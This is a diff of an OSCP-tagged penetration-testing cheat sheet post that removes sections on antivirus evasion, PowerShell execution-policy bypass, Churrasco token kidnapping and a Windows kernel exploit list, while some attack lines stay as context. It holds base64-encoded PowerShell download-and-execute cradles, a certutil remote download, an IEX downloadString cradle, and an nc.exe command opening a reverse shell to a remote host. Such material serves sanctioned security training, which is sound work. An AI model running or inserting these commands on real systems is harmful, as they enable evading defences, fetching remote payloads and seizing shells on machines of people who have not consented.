@@ -7,33 +7,6 @@ tags: [OSCP, Cheatsheet]
 layout: post
 ---
 
-###### Basic AV Evasion ~ File Uploads
-```
-base64 encoding a file upload to avoid badchars or to obfuscate.
-Example:
-
-in linux:
-> echo "powershell.exe -c 'IEX(IWR http://10.10.10.10/file.ps1 -UseBasicParsing)'" | iconv -f ASCII -t UTF-16LE | base64 | tr -d "\n"
-result = a base64 blob.
-
-Then run on attacker machine:
-> powershell.exe -nop -exec bypass -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBjACAAJwBJAEUAWAAoAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgAxADAALwBmAGkAbABlAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkAJwAKAA==
-```
-
-###### Basic AV Evasion ~ Powershell Execution Policy Bypass
-```
-> Get-ExecutionPolicy -Scope CurrentUser
-> Get-ExecutionPolicy
-
-Disable Execution Policy Protection for PowerShell
-> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
-> Set-ExecutionPolicy Unrestricted
-
-Or avoid the protection for 1 command:
-> powershell.exe -exec bypass -Command "& {certutil.exe -urlcache -f http://192.168.1.1:80/file.txt}"
-```
-
-
 ###### Start Process with PowerShell
 ```
 How to use powershell to pop a second connection with interactive shell
@@ -51,20 +24,6 @@ Then pop the shell
 > Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://192.168.1.1/file.ps1')" -Credential $cred
 ```
 
-
-###### Token Kidnapping on Windows Server 2003 / 2008 with Churrasco
-
-```
-If you are Network Service or Local Service and SeImpersonatePrivilege is Enabled, this will probably work.
-
-> git clone https://github.com/Re4son/Churrasco
-after uploading the exe:
-
-Execute Command
-> churrasco.exe -d "whoami"
-Using nc.exe to start a reverse shell connection
-> churrasco.exe -d "c:\Users\username\Documents\nc.exe -e cmd.exe 192.168.1.1 443"
-```
 
 ###### Potato attacks
 ```
@@ -131,21 +90,6 @@ $ netstat -ntlp
 5 do stuff from kali on address 127.0.0.1 port 8888
 ```
 
-
-###### Schtasks
-```
-> schtasks /query /fo LIST /v
-> tasklist /SVC
-```
-
-
-###### Windows (Kernel) Exploits
-```
-MS10-059 (SecWiki)
-MS11-046 (SecWiki)
-MS16-032 (Use the one from Empire)
-MS15-051 (SecWiki)
-```
 
 ###### Kernel Exploits ~ Resources
 ```
